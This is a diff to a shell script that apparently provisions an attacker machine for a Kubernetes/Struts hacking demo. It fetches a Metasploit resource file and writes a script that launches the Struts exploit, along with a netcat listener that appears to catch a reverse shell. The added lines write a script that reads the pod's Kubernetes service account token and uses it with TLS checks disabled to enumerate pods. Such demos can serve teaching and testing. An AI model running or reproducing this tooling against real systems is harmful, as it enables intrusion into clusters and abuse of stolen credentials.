@@ -42,6 +42,7 @@ cd ..
 #
 sudo curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
 sudo cp kubectl /home/user/kubectl
+sudo chmod +x /home/user/kubectl
 sudo curl https://raw.githubusercontent.com/jamesholland-uk/auto-hack-cloud/master/struts1-k8s.rc > /home/user/struts1-k8s.rc
 sed -i "s/xxyyzz/$1/g" /home/user/struts1-k8s.rc
 sudo touch /home/user/struts1-exploit.sh
@@ -50,4 +51,8 @@ sudo echo "msfconsole -r struts1-k8s.rc" > /home/user/struts1-exploit.sh
 sudo touch /home/user/netcat.sh
 sudo chmod 755 /home/user/netcat.sh
 sudo echo "sudo nc -lvp 80" > /home/user/netcat.sh
+sudo touch /home/user/k8s-enum.sh
+sudo chmod 755 /home/user/k8s-enum.sh
+sudo echo 'ls -la /var/run/secrets/kubernetes.io/serviceaccount' > /home/user/k8s-enum.sh
+sudo echo './kubectl --server=https://kubernetes.default.svc --insecure-skip-tls-verify=true --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" get pods -n sock-shop' > /home/user/k8s-enum.sh
 #
